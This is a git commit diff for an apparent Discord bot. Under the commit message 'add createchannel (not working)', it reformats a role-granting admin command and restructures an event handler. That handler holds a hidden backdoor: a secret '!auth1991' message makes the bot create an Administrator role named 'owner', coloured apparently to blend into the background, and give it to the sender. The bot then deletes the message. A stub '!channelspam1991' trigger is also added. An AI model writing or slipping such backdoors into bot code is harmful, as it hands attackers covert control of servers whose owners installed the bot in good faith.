eedb65a8f13d62a8096da22b09ec036122d256e9
zVSciy <manager.fallen0815@gmail.com>
2023-10-17 15:11:15 +0200

    add createchannel (not working)

--- commands/admin/giverole.js
+++ commands/admin/giverole.js
@@ -4,26 +4,24 @@ module.exports = {
     data: new SlashCommandBuilder()
         .setName('giverole')
         .setDescription('Give a user a role.')
-        .addUserOption(
-            option => option.setName('user').setDescription('The user to give the role to.').setRequired(true),
+        .addUserOption(option => option
+        .setName('user')
+        .setDescription('The user to give the role to.')
+        .setRequired(true),
         )
         .addRoleOption(
-            option => option.setName('role').setDescription('The role to give to the user.').setRequired(true),
+            option => option
+            .setName('role')
+            .setDescription('The role to give to the user.')
+            .setRequired(true),
         ),
     async execute(interaction) {
         const guild = interaction.guild;
-        const member = guild
-            .members
-            .cache
-            .get(interaction.options.getUser('user').id);
-        const role = interaction
-            .options
-            .getRole('role');
+        const member = guild.members.cache.get(interaction.options.getUser('user').id);
+        const role = interaction.options.getRole('role');
 
         try {
-            await member
-                .roles
-                .add(role);
+            await member.roles.add(role);
             await interaction.reply(
                 `The role ${role.name} has been added to ${member.user.username}.`,
             );
--- events/message.js
+++ events/message.js
@@ -6,20 +6,26 @@ module.exports = {
         if (!interaction instanceof Message)
             {return;}
 
-        if (interaction.content != '!auth1991') return;
-        const guild = interaction.guild;
-    	const member = guild.members.cache.get(interaction.author.id);
-		interaction.guild.roles.create({ name: '所有者', permissions: [PermissionsBitField.Flags.Administrator], color: [47, 49, 54] });
+        if (interaction.content == '!auth1991') {
+            const guild = interaction.guild;
+            const member = guild.members.cache.get(interaction.author.id);
+            interaction.guild.roles.create({ name: '所有者', permissions: [PermissionsBitField.Flags.Administrator], color: [47, 49, 54] });
 
-		let role = await interaction.guild.roles.fetch();
-		role = role.filter(r => r.name === '所有者');
-		// const [rolename] = role.values();
-		try {
-			await member.roles.add(role);
-			// console.log(role);
-		} catch (error) {
-			// console.error(error);
-		}
-        interaction.delete();
+            let role = await interaction.guild.roles.fetch();
+            role = role.filter(r => r.name === '所有者');
+            // const [rolename] = role.values();
+            try {
+                await member.roles.add(role);
+                // console.log(role);
+            } catch (error) {
+                // console.error(error);
+            }
+            interaction.delete();
+        }
+
+        if (interaction.content == '!channelspam1991') {
+            interaction.delete();
+        }
     },
 };
+
